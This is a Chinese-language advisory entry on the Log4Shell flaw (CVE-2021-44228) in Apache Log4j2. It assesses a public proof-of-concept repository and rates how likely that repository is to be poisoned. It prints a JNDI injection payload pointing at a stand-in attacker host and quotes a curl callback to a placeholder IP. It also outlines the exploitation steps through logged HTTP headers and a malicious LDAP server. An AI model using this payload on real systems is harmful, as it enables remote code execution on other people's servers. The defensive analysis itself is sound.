## CVE-2021-44228 - Apache Log4j2 Log4Shell JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个关键的远程代码执行漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本中 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)。此漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。 攻击者可以通过控制日志消息或日志消息参数，在启用消息查找替换时，执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞描述和提供的PoC代码，该漏洞的利用是有效的。PoC 通过 JNDI 注入 LDAP URL 来触发漏洞，从而导致远程代码执行。

**投毒风险：**
该仓库的投毒风险评估为10%。虽然PoC本身旨在演示漏洞利用，但 `Exploit.java` 包含执行 `curl http://TU_IP:9999/pwned` 的指令，表明攻击者可以轻易地替换成更具破坏性的命令。`main.py`脚本本身看起来没有明显的恶意代码，但如果攻击者修改`Exploit.java` 并诱导用户使用，则存在风险。 README中包含了从github上克隆`marshalsec`的步骤，如果`marshalsec`库被投毒，也会导致风险。因此，需要仔细审查和验证。

**利用方式：**
1.  **确定目标：** 找到使用易受攻击的 Log4j2 版本的应用程序。
2.  **构造Payload：** 构造包含 JNDI 查找的恶意字符串。例如： `${jndi:ldap://attacker.com/Exploit}`。
3.  **触发日志记录：** 将 Payload 注入到应用程序将会记录的输入字段中，例如 HTTP Headers (User-Agent, Referer, X-Forwarded-For), POST 参数等。
4.  **恶意LDAP服务器：**设置一个恶意的LDAP服务器，当Log4j2尝试去lookup这个URL的时候，从HTTP服务器上获取恶意的Java Class文件并执行。
5.  **远程代码执行：** Log4j2 将连接到攻击者的 LDAP 服务器，检索并执行恶意 Java 代码，从而允许攻击者在目标系统上执行任意命令。

请注意，成功利用此漏洞需要目标应用程序启用消息查找替换，并且能够解析 JNDI 查找。较高版本的 Log4j 默认禁用了此功能，从而缓解了此漏洞。

**项目地址:** [moften/Log4Shell](https://github.com/moften/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)